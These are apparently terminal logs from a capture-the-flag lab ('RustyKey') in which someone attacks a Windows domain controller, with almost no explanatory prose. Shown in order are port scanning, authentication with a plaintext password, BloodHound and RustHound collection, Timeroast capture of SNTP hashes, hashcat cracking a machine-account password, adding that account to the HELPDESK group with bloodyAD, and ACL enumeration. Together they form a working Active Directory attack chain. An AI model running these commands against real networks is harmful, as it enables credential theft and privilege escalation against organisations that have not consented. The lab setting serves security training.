

```python
kali@kali ~> nmap -sC -sV -Pn 10.129.196.230
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-05 06:57 EDT
Nmap scan report for 10.129.196.230
Host is up (0.19s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-05 18:57:58Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-07-05T18:58:07
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 8h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.05 seconds
```




```
kali@kali ~> nxc smb dc.rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A' -k
SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A 
```



```
kali@kali ~/H/rustkey [1]> bloodhound-ce-python -d rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A' -ns 10.129.196.230 -c all --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: rustykey.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.rustykey.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 16 computers
INFO: Connecting to LDAP server: dc.rustykey.htb
INFO: Found 12 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 10 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: 
INFO: Querying computer: dc.rustykey.htb
ERROR: Unhandled exception in computer dc.rustykey.htb processing: The NETBIOS connection with the remote host timed out.
INFO: Traceback (most recent call last):
  File "/home/kali/.local/share/pipx/venvs/bloodhound-ce/lib/python3.13/site-packages/impacket/nmb.py", line 986, in non_polling_read
    received = self._sock.recv(bytes_left)
TimeoutError: timed out

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/kali/.local/share/pipx/venvs/bloodhound-ce/lib/python3.13/site-packages/bloodhound/enumeration/computers.py", line 136, in process_computer
    unresolved = c.rpc_get_group_members(580, c.psremote)
  File "/home/kali/.local/share/pipx/venvs/bloodhound-ce/lib/python3.13/site-packages/bloodhound/ad/computer.py", line 839, in rpc_get_group_members
    raise e
  File "/home/kali/.local/share/pipx/venvs/bloodhound-ce/lib/python3.13/site-packages/bloodhound/ad/computer.py", line 802, in rpc_get_group_members
    resp = samr.hSamrQueryInformationAlias(dce, aliasHandle=aliashandle)
  File "/home/kali/.local/share/pipx/venvs/bloodhound-ce/lib/python3.13/site-packages/impacket/dcerpc/v5/samr.py", line 2631, in hSamrQueryInformationAlias
    return dce.request(request)
           ~~~~~~~~~~~^^^^^^^^^
  File "/home/kali/.local/share/pipx/venvs/bloodhound-ce/lib/python3.13/site-packages/impacket/dcerpc/v5/rpcrt.py", line 860, in request
    self.call(request.opnum, request, uuid)
    ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/.local/share/pipx/venvs/bloodhound-ce/lib/python3.13/site-packages/impacket/dcerpc/v5/rpcrt.py", line 849, in call
    return self.send(DCERPC_RawCall(function, body.getData(), uuid))
           ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/.local/share/pipx/venvs/bloodhound-ce/lib/python3.13/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1302, in send
    self._transport_send(data)
    ~~~~~~~~~~~~~~~~~~~~^^^^^^
  File "/home/kali/.local/share/pipx/venvs/bloodhound-ce/lib/python3.13/site-packages/impacket/dcerpc/v5/rpcrt.py", line 1239, in _transport_send
    self._transport.send(rpc_packet.get_packet(), forceWriteAndx = forceWriteAndx, forceRecv = forceRecv)
    ~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/.local/share/pipx/venvs/bloodhound-ce/lib/python3.13/site-packages/impacket/dcerpc/v5/transport.py", line 543, in send
    self.__smb_connection.writeFile(self.__tid, self.__handle, data)
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/.local/share/pipx/venvs/bloodhound-ce/lib/python3.13/site-packages/impacket/smbconnection.py", line 543, in writeFile
    return self._SMBConnection.writeFile(treeId, fileId, data, offset)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/.local/share/pipx/venvs/bloodhound-ce/lib/python3.13/site-packages/impacket/smb3.py", line 1739, in writeFile
    written = self.write(treeId, fileId, writeData, writeOffset, len(writeData))
  File "/home/kali/.local/share/pipx/venvs/bloodhound-ce/lib/python3.13/site-packages/impacket/smb3.py", line 1443, in write
    ans = self.recvSMB(packetID)
  File "/home/kali/.local/share/pipx/venvs/bloodhound-ce/lib/python3.13/site-packages/impacket/smb3.py", line 514, in recvSMB
    data = self._NetBIOSSession.recv_packet(self._timeout)
  File "/home/kali/.local/share/pipx/venvs/bloodhound-ce/lib/python3.13/site-packages/impacket/nmb.py", line 917, in recv_packet
    data = self.__read(timeout)
  File "/home/kali/.local/share/pipx/venvs/bloodhound-ce/lib/python3.13/site-packages/impacket/nmb.py", line 1004, in __read
    data = self.read_function(4, timeout)
  File "/home/kali/.local/share/pipx/venvs/bloodhound-ce/lib/python3.13/site-packages/impacket/nmb.py", line 988, in non_polling_read
    raise NetBIOSTimeout
impacket.nmb.NetBIOSTimeout: The NETBIOS connection with the remote host timed out.

INFO: Done in 00M 17S
INFO: Compressing output into 20250705150510_bloodhound.zip

```






```
kali@kali ~/H/rustkey [2]> rusthound-ce --domain rustykey.htb -u 'rr.parker' -p '8#t5HE8L!W3A' --name-server 10.129.196.230 -c All --zip
---------------------------------------------------
Initializing RustHound-CE at 15:06:17 on 07/05/25
Powered by @g0h4n_0
---------------------------------------------------

[2025-07-05T19:06:17Z INFO  rusthound_ce] Verbosity level: Info
[2025-07-05T19:06:17Z INFO  rusthound_ce] Collection method: All
[2025-07-05T19:06:17Z INFO  rusthound_ce::ldap] Connected to RUSTYKEY.HTB Active Directory!
[2025-07-05T19:06:17Z INFO  rusthound_ce::ldap] Starting data collection...
[2025-07-05T19:06:17Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-07-05T19:06:18Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=rustykey,DC=htb
[2025-07-05T19:06:18Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-07-05T19:06:19Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=rustykey,DC=htb
[2025-07-05T19:06:19Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-07-05T19:06:20Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=rustykey,DC=htb
[2025-07-05T19:06:20Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-07-05T19:06:20Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=rustykey,DC=htb
[2025-07-05T19:06:20Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2025-07-05T19:06:20Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=rustykey,DC=htb
[2025-07-05T19:06:20Z INFO  rusthound_ce::json::parser] Starting the LDAP objects parsing...
[2025-07-05T19:06:21Z INFO  rusthound_ce::json::parser] Parsing LDAP objects finished!
[2025-07-05T19:06:21Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2025-07-05T19:06:21Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2025-07-05T19:06:21Z INFO  rusthound_ce::json::maker::common] 12 users parsed!
[2025-07-05T19:06:21Z INFO  rusthound_ce::json::maker::common] 66 groups parsed!
[2025-07-05T19:06:21Z INFO  rusthound_ce::json::maker::common] 16 computers parsed!
[2025-07-05T19:06:21Z INFO  rusthound_ce::json::maker::common] 10 ous parsed!
[2025-07-05T19:06:21Z INFO  rusthound_ce::json::maker::common] 3 domains parsed!
[2025-07-05T19:06:21Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2025-07-05T19:06:21Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2025-07-05T19:06:21Z INFO  rusthound_ce::json::maker::common] .//20250705150621_rustykey-htb_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 15:06:21 on 07/05/25! Happy Graphing!


```



```
kali@kali ~/H/r/Timeroast (main) [2]> python timeroast.py dc.rustykey.htb
1000:$sntp-ms$831fddd17ba9d660ab263d694e6fbdaa$1c0111e900000000000a19684c4f434cec13f3d1a71e7536e1b8428bffbfcd0aec1415514f0e057cec1415514f0e1cf9
1104:$sntp-ms$8313a580a0a72bde1e902603b7bd9787$1c0111e900000000000a19694c4f434cec13f3d1a89e1b08e1b8428bffbfcd0aec141551f87d3331ec141551f87d6586
1103:$sntp-ms$648faf608600a0d86b6a9b073f505a6d$1c0111e900000000000a19694c4f434cec13f3d1a89cf71ce1b8428bffbfcd0aec141551f87bfe7eec141551f87c484f
1105:$sntp-ms$f56a8c0850cf3e74f4459e204fed2c76$1c0111e900000000000a19694c4f434cec13f3d1a99ccc54e1b8428bffbfcd0aec1415520584032fec141552058453b7
1106:$sntp-ms$d0e5a3b3300454199bf360095f5ed783$1c0111e900000000000a19694c4f434cec13f3d1a99e1f3ae1b8428bffbfcd0aec1415520585688aec14155205859c8c
1107:$sntp-ms$8275583c6e955096df67adf1092119ac$1c0111e900000000000a19694c4f434cec13f3d1a9c155a0e1b8428bffbfcd0aec14155205a8a753ec14155205a8d145
1119:$sntp-ms$2256a4a4930b1e866c3490f6cb8ee020$1c0111e900000000000a19694c4f434cec13f3d1a816575ae1b8428bffbfcd0aec141552141e7967ec141552141e9292
1118:$sntp-ms$f85803282bd1b14254d9c53b9f3fd2e2$1c0111e900000000000a19694c4f434cec13f3d1a8153f2ce1b8428bffbfcd0aec141552141d5f8cec141552141d7a64
1121:$sntp-ms$6fe08eb24b23817c5f52c0195bcac334$1c0111e900000000000a19694c4f434cec13f3d1a830dec5e1b8428bffbfcd0aec1415521438f514ec14155214391f05
1120:$sntp-ms$ebe3fb0332376a63019383a6251d0ca5$1c0111e900000000000a19694c4f434cec13f3d1a82f364ee1b8428bffbfcd0aec14155214374ff8ec1415521437768e
1122:$sntp-ms$84eada94acda2cbcefeda21b98cbadf2$1c0111e900000000000a19694c4f434cec13f3d1aacc3ad6e1b8428bffbfcd0aec14155216d4364dec14155216d48527
1124:$sntp-ms$98ed06a6eb89239546c422ca742da167$1c0111e900000000000a19694c4f434cec13f3d1a7d50f91e1b8428bffbfcd0aec1415521fa3c71aec1415521fa3f7c1
1123:$sntp-ms$e3dfc8a87009ccfac7985a8b18111453$1c0111e900000000000a19694c4f434cec13f3d1a7d3a52ee1b8428bffbfcd0aec1415521fa24d9dec1415521fa295c1
1126:$sntp-ms$e7204a415bb962f7430cff40625e867d$1c0111e900000000000a19694c4f434cec13f3d1a7f7c823e1b8428bffbfcd0aec1415521fc68661ec1415521fc6aea5
1125:$sntp-ms$79f91f4a15703924ae0f0370ca5095cf$1c0111e900000000000a19694c4f434cec13f3d1a7f642e7e1b8428bffbfcd0aec1415521fc4ff78ec1415521fc53020
1127:$sntp-ms$3b1fa9f0b79172f53c991d7c8d7264d7$1c0111e900000000000a19694c4f434cec13f3d1a8153a23e1b8428bffbfcd0aec1415521fe3f507ec1415521fe420a6
```



```python
[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Mode........: 31300 (MS SNTP)
Hash.Target......: ../Timeroast/hashes.txt
Time.Started.....: Sat Jul  5 19:16:51 2025 (21 secs)
Time.Estimated...: Sat Jul  5 19:17:21 2025 (9 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  7551.3 kH/s (0.33ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 0/16 (0.00%) Digests (total), 0/16 (0.00%) Digests (new), 0/16 (0.00%) Salts
Progress.........: 159133696/229510160 (69.34%)
Rejected.........: 0/159133696 (0.00%)
Restore.Point....: 9945088/14344385 (69.33%)
Restore.Sub.#01..: Salt:3 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: assenavyemma -> asmaa22
Hardware.Mon.#01.: Util: 62%

$sntp-ms$79f91f4a15703924ae0f0370ca5095cf$1c0111e900000000000a19694c4f434cec13f3d1a7f642e7e1b8428bffbfcd0aec1415521fc4ff78ec1415521fc53020:Rusty88!
```




```
kali@kali ~/H/r/hashcat-6.2.6> nxc smb 10.129.196.230 -u 'IT-COMPUTER3$' -p 'Rusty88!'  -k
SMB         10.129.196.230  445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         10.129.196.230  445    dc               [+] rustykey.htb\IT-COMPUTER3$:Rusty88! 

```


```python
kali@kali ~/H/r/hashcat-6.2.6 [2]> bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' add groupMember HELPDESK 'IT-COMPUTER3$'
[+] IT-COMPUTER3$ added to HELPDESK
```





Enumerating 

```python
╭─LDAP─[dc.rustykey.htb]─[RUSTYKEY\rr.parker]-[NS:<auto>] [WEB]
╰─PV ❯ Get-ObjectAcl "CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB" -Select SecurityIdentifier,AccessMask,ActiveDirectoryRights,ObjectAceType -Where 'SecurityIdentifier not Principal Self' -ResolveGUIDs

AccessMask                  : WriteProperty
ObjectAceType               : Member
SecurityIdentifier          : RUSTYKEY\HelpDesk

AccessMask                  : ReadProperty
ObjectAceType               : Token-Groups-Global-And-Universal
SecurityIdentifier          : BUILTIN\Windows Authorization Access Group

AccessMask                  : ControlAccess
ObjectAceType               : Send-To
SecurityIdentifier          : Authenticated Users

ActiveDirectoryRights       : FullControl
AccessMask                  : FullControl
SecurityIdentifier          : RUSTYKEY\Domain Admins

ActiveDirectoryRights       : ReadProperties,ListChildObjects
AccessMask                  : ReadProperties,ListChildObjects
SecurityIdentifier          : RUSTYKEY\HelpDesk

ActiveDirectoryRights       : FullControl
AccessMask                  : FullControl
SecurityIdentifier          : Account Operators

ActiveDirectoryRights       : Read
AccessMask                  : Read
SecurityIdentifier          : Authenticated Users

ActiveDirectoryRights       : FullControl
AccessMask                  : FullControl
SecurityIdentifier          : Local System

AccessMask                  : ReadProperty
ObjectAceType               : User-Account-Restrictions
SecurityIdentifier          : BUILTIN\Pre-Windows 2000 Compatible Access

```


so far the group protected objects is very suspicious and it would make sense to remove the users we want from the nested groups inside of protected objects